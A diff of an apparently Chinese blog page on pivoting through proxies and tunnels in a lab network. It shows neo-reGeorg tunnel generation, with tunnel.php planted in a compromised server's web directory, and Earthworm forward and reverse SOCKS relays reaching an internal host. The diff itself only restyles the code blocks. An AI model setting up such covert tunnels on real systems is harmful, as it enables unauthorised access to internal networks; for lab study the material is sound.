@@ -507,27 +507,27 @@
                 <h1 id="代理和隧道技术"><a href="#代理和隧道技术" class="headerlink" title="代理和隧道技术"></a>代理和隧道技术</h1><h2 id="neo-neoreg代理"><a href="#neo-neoreg代理" class="headerlink" title="neo-neoreg代理"></a>neo-neoreg代理</h2><p>黑客（192.168.3.134）——-（192.168.3.143）server1（172.16.1.105）—-（172.16.1.103）server2</p>
 <p>在server1随便搭建一个网站</p>
 <p>然后在黑客里下载neo-neoreg</p>
-<pre><code>python neoreg.py generate -k mima123
+<pre class=" language-Linux"><code class="language-Linux">python neoreg.py generate -k mima123
 </code></pre>
 <p>把制作好的东西扔进server1里的网站目录下</p>
 <p>继续回到黑客主机里</p>
-<pre><code>python neoreg.py -k mima123 -u http://192.168.3.143/tunnel.php
+<pre class=" language-Linux"><code class="language-Linux">python neoreg.py -k mima123 -u http://192.168.3.143/tunnel.php
 </code></pre>
 <p>然后打开浏览器，在代理里面设置代理</p>
 <p><img src="/2022/03/29/agents-and-tunnels/image-20220330095916789.png" alt="image-20220330095916789"></p>
 <h2 id="earthworm代理"><a href="#earthworm代理" class="headerlink" title="earthworm代理"></a>earthworm代理</h2><h3 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h3><p>在server1(windows)上放上这个软件</p>
-<pre><code>ew_for_Win.exe -s ssocksd -l 8888
+<pre class=" language-Linux"><code class="language-Linux">ew_for_Win.exe -s ssocksd -l 8888
 </code></pre>
 <p>黑客</p>
-<pre><code>nano /etc/proxychains
+<pre class=" language-Linux"><code class="language-Linux">nano /etc/proxychains
 socks5 192.168.3.143 8888
 </code></pre>
 <h3 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h3><p>把server2上面的流量转发到中间人这边，再从中间人转到黑客</p>
 <p>server1</p>
-<pre><code>ew -s rcsocks -l 1080 -e 1024
+<pre class=" language-Linux"><code class="language-Linux">ew -s rcsocks -l 1080 -e 1024
 </code></pre>
 <p>server2</p>
-<pre><code>ew -s rssocks -d 172.16.1.105 -e 1024
+<pre class=" language-Linux"><code class="language-Linux">ew -s rssocks -d 172.16.1.105 -e 1024
 </code></pre>
 <p>黑客</p>
 <p>不用改动</p>
